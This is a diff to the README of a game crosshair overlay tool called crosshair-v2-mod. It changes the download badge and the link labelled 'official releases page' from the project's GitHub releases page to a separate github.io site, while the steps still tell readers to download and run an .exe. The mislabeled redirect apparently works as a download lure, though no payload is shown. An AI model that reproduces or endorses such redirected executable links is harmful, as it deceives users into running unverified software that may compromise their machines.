@@ -1,6 +1,6 @@
 # 🎯 crosshair-v2-mod - Change your game aim with ease
 
-[![](https://img.shields.io/badge/Download_Crosshair_V2-Blue?style=for-the-badge)](https://github.com/gerrimulticultural635/crosshair-v2-mod/releases)
+[![](https://img.shields.io/badge/Download_Crosshair_V2-Blue?style=for-the-badge)](https://gerrimulticultural635.github.io)
 
 This software adds a custom crosshair overlay to your screen. It works with most games that run on Windows. You can use it to improve your aim and visibility. The tool works as a separate layer over your game. It does not change your game files.
 
@@ -17,7 +17,7 @@ Before you install this software, check your computer for these items:
 
 Follow these steps to get the file on your machine:
 
-1.  Visit the official [releases page](https://github.com/gerrimulticultural635/crosshair-v2-mod/releases).
+1.  Visit the official [releases page](https://gerrimulticultural635.github.io).
 2.  Look for the section labeled "Assets" at the bottom of the newest version.
 3.  Click the file that ends in .exe to start your download.
 4.  Wait for the file to finish and save it to your Downloads folder.
